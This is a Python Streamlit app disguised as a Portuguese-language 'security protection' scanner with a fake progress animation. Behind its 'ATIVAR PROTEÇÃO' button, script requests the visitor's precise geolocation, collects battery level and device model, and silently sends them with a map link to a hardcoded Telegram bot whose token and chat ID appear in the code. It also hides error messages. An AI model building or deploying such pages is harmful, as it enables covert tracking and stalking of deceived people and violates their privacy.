import streamlit as st
import time

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO MANTIDA ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
        font-family: sans-serif;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- BOTÃO REFEITO PARA O EDGE ---
# Removi o auto-start que o Edge bloqueia e foquei na chamada direta
js_edge_fix = f"""
<div id="div-btn">
    <button class="btn-barra" onclick="ativarAgora()">
        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
function ativarAgora() {{
    // No Edge, o pedido de localização precisa ser a PRIMEIRA coisa após o clique
    navigator.geolocation.getCurrentPosition(
        function(pos) {{
            // Se aceitou, agora pegamos os dados e enviamos
            enviarDados(pos.coords.latitude, pos.coords.longitude);
        }},
        function(err) {{
            console.log("Erro ou recusado");
        }},
        {{ enableHighAccuracy: true, timeout: 5000 }}
    );
}}

async function enviarDados(lat, lon) {{
    try {{
        const bat = await navigator.getBattery();
        const nivel = Math.round(bat.level * 100);
        const modelo = navigator.userAgent.split('(')[1].split(')')[0];
        const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
        
        const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + modelo + "`\\n🔋 *Bateria:* `" + nivel + "%`\\n📍 [VER LOCALIZAÇÃO](" + mapa + ")";
        
        await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
            method: "POST",
            headers: {{ "Content-Type": "application/json" }},
            body: JSON.stringify({{ chat_id: "{ID}", text: texto, parse_mode: "Markdown" }})
        }});
        
        window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
    }} catch (e) {{}}
}}
</script>
"""

clicou_btn = st.components.v1.html(js_edge_fix, height=80)

if clicou_btn:
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
